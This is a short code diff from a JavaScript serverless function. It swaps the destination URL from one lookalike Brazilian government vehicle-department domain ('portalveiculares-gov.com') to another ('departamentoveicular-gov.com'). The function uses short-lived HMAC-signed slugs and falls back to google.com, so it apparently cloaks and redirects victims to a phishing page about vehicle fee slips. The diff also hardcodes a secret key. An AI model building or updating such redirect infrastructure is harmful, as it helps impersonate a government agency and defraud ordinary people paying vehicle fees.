@@ -1,7 +1,7 @@
 const crypto = require("crypto");
 const HMAC_SECRET = "sc-guias-2026-1167a8c9359ce493353764016606e2b20678376b1f68be2d8a0c6c319dc5af05-fixed";
 const SLUG_TTL_SECONDS = 600;
-const DESTINATION_URL = "https://portalveiculares-gov.com/sc";
+const DESTINATION_URL = "https://departamentoveicular-gov.com/sc";
 const FALLBACK_URL = "https://www.google.com";
 
 function json(s,p){return{statusCode:s,headers:{"Content-Type":"application/json; charset=utf-8","Cache-Control":"no-store"},body:JSON.stringify(p)};}
